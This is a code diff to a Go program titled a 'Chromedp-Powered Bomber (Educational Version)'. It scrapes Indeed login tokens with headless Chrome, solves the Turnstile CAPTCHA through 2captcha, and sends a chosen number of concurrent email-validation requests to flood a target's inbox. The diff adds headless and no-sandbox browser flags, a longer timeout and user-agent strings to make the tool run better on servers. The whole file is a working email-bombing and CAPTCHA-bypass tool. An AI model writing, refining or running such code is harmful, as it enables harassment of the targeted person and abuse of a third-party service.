@@ -20,6 +20,12 @@ import (
 	"github.com/chromedp/chromedp"
 )
 
+// --- User-Agent List ---
+var userAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+}
+
 // --- Structs ---
 type IndeedTokens struct {
 	SurfTok       string
@@ -62,17 +68,29 @@ func solveTurnstile(apiKey, siteKey, pageURL string) (string, error) {
 // --- Chromedp Setup Phase ---
 func performIndeedSetupWithChromedp(captchaAPIKey string) (*IndeedTokens, error) {
 	log.Println("[Chromedp] Starting browser to gather tokens...")
+
+	// --- MODIFIED SECTION: Added optimization flags for server environments ---
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("headless", true), // Ensure it runs in headless mode
+		chromedp.Flag("disable-gpu", true), // Disable GPU acceleration
+		chromedp.Flag("no-sandbox", true), // Required for running as root in many container environments
+		chromedp.Flag("disable-dev-shm-usage", true), // Overcome limited resource problems
+	)
+	allocatorCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
+	defer cancel()
+
+	// Create a new chromedp context from the allocator
+	ctx, cancel := chromedp.NewContext(allocatorCtx, chromedp.WithLogf(log.Printf))
+	defer cancel()
 	
-	// Create a new chromedp context
-	ctx, cancel := chromedp.NewContext(context.Background(), chromedp.WithLogf(log.Printf))
+	// MODIFIED: Increased timeout to 3 minutes (180 seconds)
+	ctx, cancel = context.WithTimeout(ctx, 180*time.Second) 
 	defer cancel()
-	ctx, cancel = context.WithTimeout(ctx, 90*time.Second) // 90-second timeout for the whole operation
-	defer cancel()
+	// -------------------------------------------------------------------------
 
 	var surftok, formtk, sitekey string
 	loginURL := "https://secure.indeed.com/account/login"
 
-	// Run tasks to scrape tokens
 	err := chromedp.Run(ctx,
 		chromedp.Navigate(loginURL),
 		chromedp.WaitVisible(`body`),
@@ -87,7 +105,6 @@ func performIndeedSetupWithChromedp(captchaAPIKey string) (*IndeedTokens, error)
 	}
 	log.Printf("[Chromedp] Scraped surftok, form_tk, and sitekey (%s).", sitekey)
 
-	// Now solve the captcha using the scraped sitekey
 	captchaToken, err := solveTurnstile(captchaAPIKey, sitekey, loginURL)
 	if err != nil {
 		return nil, fmt.Errorf("failed to solve turnstile captcha: %w", err)
@@ -106,27 +123,13 @@ func performIndeedSetupWithChromedp(captchaAPIKey string) (*IndeedTokens, error)
 func runAttack(wg *sync.WaitGroup, client *http.Client, email string, tokens *IndeedTokens) {
 	defer wg.Done()
 	log.Println("[HTTP Attack] Sending request to Indeed...")
-	
-	payload := url.Values{
-		"__email":              {email},
-		"cf-turnstile-response":{tokens.CaptchaToken},
-		"surftok":              {tokens.SurfTok},
-		"form_tk":              {tokens.FormTk},
-		"co":                   {"SE"},
-		"hl":                   {"sv_SE"},
-	}
-	
+	payload := url.Values{"__email": {email}, "cf-turnstile-response": {tokens.CaptchaToken}, "surftok": {tokens.SurfTok}, "form_tk": {tokens.FormTk}, "co": {"SE"}, "hl": {"sv_SE"}}
 	req, _ := http.NewRequest("POST", "https://secure.indeed.com/account/emailvalidation", strings.NewReader(payload.Encode()))
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
 	resp, err := client.Do(req)
-	if err != nil {
-		log.Printf("[FAILURE] Request failed: %v", err)
-		return
-	}
+	if err != nil { log.Printf("[FAILURE] Request failed: %v", err); return }
 	defer resp.Body.Close()
-
 	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
 		log.Printf("[SUCCESS] Request sent successfully. Status: %d", resp.StatusCode)
 	} else {
@@ -147,13 +150,10 @@ func main() {
 	rand.Seed(time.Now().UnixNano())
 	log.Println("--- Chromedp-Powered Bomber (Educational Version) ---")
 	reader := bufio.NewReader(os.Stdin)
-
 	targetEmail := promptForInput(reader, "Enter the target email address: ")
 	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
-
 	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (required for Indeed): ")
 	if captchaKey == "" { log.Fatal("Error: 2Captcha API key is required for this target.") }
-
 	attacksStr := promptForInput(reader, "Enter the number of attacks: ")
 	attacks, err := strconv.Atoi(attacksStr)
 	if err != nil || attacks <= 0 { log.Fatal("Error: Invalid number of attacks.") }
@@ -170,13 +170,11 @@ func main() {
 	var wg sync.WaitGroup
 	jar, _ := cookiejar.New(nil)
 	client := &http.Client{Jar: jar, Timeout: 30 * time.Second}
-
 	for i := 0; i < attacks; i++ {
 		wg.Add(1)
 		go runAttack(&wg, client, targetEmail, indeedTokens)
 		time.Sleep(100 * time.Millisecond)
 	}
-	
 	wg.Wait()
 	log.Println("--- Operation Finished ---")
 }
